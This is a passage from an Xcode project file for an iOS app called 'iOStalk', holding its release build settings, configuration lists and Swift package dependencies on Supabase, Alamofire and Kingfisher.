				DEVELOPMENT_ASSET_PATHS = "\"iOStalk/Preview Content\"";
				DEVELOPMENT_TEAM = GZA56QT8DR;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.tal.demo.exmaple;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		052E45982DA050F6009CAB58 /* Build configuration list for PBXProject "iOStalk" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				052E45AB2DA050F7009CAB58 /* Debug */,
				052E45AC2DA050F7009CAB58 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		052E45AD2DA050F7009CAB58 /* Build configuration list for PBXNativeTarget "iOStalk" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				052E45AE2DA050F7009CAB58 /* Debug */,
				052E45AF2DA050F7009CAB58 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		052E45C02DA05354009CAB58 /* XCRemoteSwiftPackageReference "supabase-swift" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/supabase/supabase-swift.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 2.0.0;
			};
		};
		0572198E2F74458600656896 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.11.1;
			};
		};
		057332E12EDCC2E100FB9354 /* XCRemoteSwiftPackageReference "Kingfisher" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/onevcat/Kingfisher.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 8.6.2;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		052E45C12DA05354009CAB58 /* Supabase */ = {
			isa = XCSwiftPackageProductDependency;
			package = 052E45C02DA05354009CAB58 /* XCRemoteSwiftPackageReference "supabase-swift" */;
			productName = Supabase;
		};
		0572198F2F74458600656896 /* Alamofire */ = {
			isa = XCSwiftPackageProductDependency;
			package = 0572198E2F74458600656896 /* XCRemoteSwiftPackageReference "Alamofire" */;
			productName = Alamofire;
		};
		057332E22EDCC2E100FB9354 /* Kingfisher */ = {
			isa = XCSwiftPackageProductDependency;
			package = 057332E12EDCC2E100FB9354 /* XCRemoteSwiftPackageReference "Kingfisher" */;
			productName = Kingfisher;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 052E45952DA050F6009CAB58 /* Project object */;
}
